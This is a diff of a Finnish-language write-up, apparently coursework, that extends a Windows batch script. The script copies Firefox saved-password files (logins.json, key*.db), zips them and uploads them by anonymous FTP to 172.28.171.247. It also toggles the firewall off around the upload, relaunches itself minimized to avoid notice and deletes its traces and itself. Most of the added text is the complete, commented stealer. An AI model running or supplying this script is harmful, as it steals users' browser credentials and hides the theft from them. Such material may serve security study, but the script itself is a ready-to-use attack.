@@ -195,7 +195,57 @@ netsh advfirewall set allprofiles state on
 del temp.txt
 del varas.bat
 ```
-Pientä hiomista vielä vaaditaan lisää.
+Päätin vielä lisäillä muutaman kohdan, jotta .bat poistaa itsensä ja pysyy minimized tilassa ollakseen huomaamaton.  
+Lisäsin batin alkuun kohdan:
+```
+@echo off
+if "%1"=="done" goto runtime
+start "" /min %0 done
+exit
+
+:runtime
+```
+Tämä aloittaa batin, mutta avaa itsensä uudelleen pienennettynä. Näin ollen se todennäköisesti herättää vähemmän huomiota.  
+  
+Lisäksi laitoin .batin tuhoamaan itsensä ja poistamaan kaikki tiedostot, joita se loi salasanojen lähettämistä varten komennolla:
+```
+del C:\salasanat /S /F /Q
+rmdir /s /q C:\salasanat
+DEL "%~f0" && EXIT
+```
+Tässä del /S /F /Q poistaa pakotetusti ja hiljaisesti kaikki tiedostot C:\salasanat sisältä, jonne aikaisemmin kopioitiin firefoxin salasana tiedostot ja jossa on myös tuo pakattu salasanat.zip tiedosto.  
+Seuraava rivi rmdir poistaa hiljaisesti tuon tyhjän salasanat kansion.  
+Viimeinen rivi poistaa bat tiedoston itsensä ja sulkee samalla komentorivin.  
+Kokonaisuudessaan .bat näyttää nyt siis tältä:
+```
+@echo off
+if "%1"=="done" goto runtime
+start "" /min %0 done
+exit
+
+:runtime
+mkdir C:\salasanat\
+powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\logins.json -Destination C:\salasanat\
+powershell Copy-Item -Path C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.*\key*.db -Destination C:\salasanat\
+powershell Compress-Archive -Path C:\salasanat -DestinationPath C:\salasanat\salasanat.zip
+@echo off
+echo open 172.28.171.247> temp.txt
+echo anonymous>> temp.txt
+echo asd >> temp.txt
+echo cd salasanat>> temp.txt
+echo quote pasv>> temp.txt
+echo binary>> temp.txt
+echo send C:\salasanat\salasanat.zip>> temp.txt
+echo quit>> temp.txt
+netsh advfirewall set allprofiles state off
+ftp -s:temp.txt
+netsh advfirewall set allprofiles state on
+del temp.txt
+del C:\salasanat /S /F /Q
+rmdir /s /q C:\salasanat
+DEL "%~f0" && EXIT
+```
+
 
 
 
